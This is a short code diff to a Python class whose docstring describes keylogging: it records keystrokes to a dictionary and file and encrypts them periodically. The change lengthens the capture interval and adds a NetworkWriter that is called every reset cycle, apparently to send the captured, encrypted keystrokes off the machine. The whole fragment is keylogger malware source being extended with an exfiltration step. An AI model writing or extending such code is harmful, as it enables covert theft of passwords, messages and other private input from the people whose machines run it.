@@ -16,11 +16,12 @@ class Manager:
     def activity(self):
         """Perform the keylogging activity,
         writing data to a dictionary and file, and encrypting it periodically."""
-        minute = 5
+        minute = 60
         send_encryption = 5
         reset = 15
         dw = DictWriter()
         fw = FileWriter()
+        nw = NetworkWriter()
         count = 0
         while True:
             # Wait for a minute
@@ -44,7 +45,7 @@ class Manager:
                     # Write the encrypted dictionary to the file
                     fw.write(dict_encrypt)
                 if count >= reset:
-                    DictWriter()
+                    nw.write()
                     count = 0
 
 
